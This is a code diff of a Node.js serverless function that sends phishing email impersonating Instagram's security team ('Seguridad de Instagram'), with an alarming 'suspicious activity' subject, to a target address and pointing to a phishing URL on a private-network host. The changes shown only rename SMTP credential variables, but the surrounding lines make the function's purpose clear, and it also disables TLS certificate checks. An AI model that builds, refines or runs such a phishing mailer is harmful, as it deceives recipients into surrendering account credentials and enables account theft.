@@ -13,7 +13,10 @@ exports.handler = async (event) => {
     console.log('EMAIL_USER:', process.env.EMAIL_USER);
     console.log('EMAIL_PASS length:', process.env.EMAIL_PASS?.length);
 
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+    const user = process.env.SMTP_USER;
+    const pass = process.env.SMTP_PASS;
+
+    if (!user || !pass) {
       throw new Error('Faltan credenciales de email en variables de entorno');
     }
 
@@ -22,8 +25,8 @@ exports.handler = async (event) => {
       port: 587,
       secure: false,
       auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
+        user: user,
+        pass: pass
       },
       tls: {
         rejectUnauthorized: false
@@ -37,7 +40,7 @@ exports.handler = async (event) => {
     const phishingUrl = 'http://192.168.56.1:3000';
 
     const mailOptions = {
-      from: `"Seguridad de Instagram" <${process.env.EMAIL_USER}>`,
+      from: `"Seguridad de Instagram" <${user}>`,
       to: targetEmail,
       subject: 'Alerta de seguridad: Actividad sospechosa detectada',
       html: `
